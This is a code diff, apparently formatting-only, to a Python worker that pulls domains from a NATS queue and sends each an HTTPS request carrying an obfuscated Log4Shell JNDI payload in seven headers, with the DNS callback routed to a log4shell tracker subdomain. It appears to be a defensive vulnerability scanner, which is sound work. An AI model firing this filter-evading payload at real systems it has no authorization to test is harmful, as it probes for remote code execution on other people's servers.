@@ -17,6 +17,7 @@ from concurrent.futures import TimeoutError, ProcessPoolExecutor
 import requests
 from nats.aio.client import Client as NATS
 import urllib3
+
 urllib3.disable_warnings()
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
@@ -29,40 +30,61 @@ QUEUE_GROUP = os.getenv("QUEUE_GROUP")
 SERVERLIST = os.getenv("NATS_SERVERS")
 SERVERS = SERVERLIST.split(",")
 
+
 def to_json(msg):
     print(json.dumps(msg))
 
+
 def payload(hashed_domain, header):
-    encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
-    payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://127.0.0.1#" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
+    encoded_header = (
+        base64.b64encode(header.encode("utf-8")).decode("utf-8").rstrip("=")
+    )
+    payload = (
+        "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://127.0.0.1#"
+        + f"{hashed_domain}.{encoded_header}"
+        + ".t.log4shell.tracker.alpha.canada.ca}"
+    )
     return payload
+
 
 def log4shell(domain, domain_hash):
     try:
         headers = {
-            'User-Agent': payload(domain_hash, "User-Agent"),
-            'Referer': payload(domain_hash, "Referer"),
-            'X-Api-Version': payload(domain_hash, "X-Api-Version"),
-            'X-Csrf-Token': payload(domain_hash, 'X-Csrf-Token'),
-            'X-CSRFToken': payload(domain_hash, 'X-CSRFToken'),
-            'X-Forwarded-For': payload(domain_hash, 'X-Forwarded-For'),
-            'Cookie': payload(domain_hash, 'Cookie'),
+            "User-Agent": payload(domain_hash, "User-Agent"),
+            "Referer": payload(domain_hash, "Referer"),
+            "X-Api-Version": payload(domain_hash, "X-Api-Version"),
+            "X-Csrf-Token": payload(domain_hash, "X-Csrf-Token"),
+            "X-CSRFToken": payload(domain_hash, "X-CSRFToken"),
+            "X-Forwarded-For": payload(domain_hash, "X-Forwarded-For"),
+            "Cookie": payload(domain_hash, "Cookie"),
         }
         # only use tls because that way headers are encrypted
         response = requests.get(f"https://{domain}", headers=headers, timeout=TIMEOUT)
         response.raise_for_status()
-        to_json({"domain": domain, "hash": domain_hash, "headers": headers, "status": response.status_code, "redirects": list(map(lambda res: res.url, response.history))})
+        to_json(
+            {
+                "domain": domain,
+                "hash": domain_hash,
+                "headers": headers,
+                "status": response.status_code,
+                "redirects": list(map(lambda res: res.url, response.history)),
+            }
+        )
     except requests.exceptions.HTTPError as e:
-        to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
+        to_json(
+            {
+                "exception": True,
+                "status": e.response.status_code,
+                "reason": e.response.reason,
+            }
+        )
     except requests.ConnectionError as e:
-        to_json({'exception': True,'unreachable': domain})
+        to_json({"exception": True, "unreachable": domain})
     except requests.exceptions.ReadTimeout as e:
-        to_json({'exception': True,'timeout': domain})
+        to_json({"exception": True, "timeout": domain})
     except requests.RequestException as e:
         print(e)
         pass
-
-
 
 
 async def run(loop):
@@ -95,7 +117,9 @@ async def run(loop):
             loop = asyncio.get_event_loop()
 
             with ProcessPoolExecutor() as executor:
-                await loop.run_in_executor(executor, functools.partial(log4shell, domain, domain_hash))
+                await loop.run_in_executor(
+                    executor, functools.partial(log4shell, domain, domain_hash)
+                )
 
         except TimeoutError:
             logging.error(
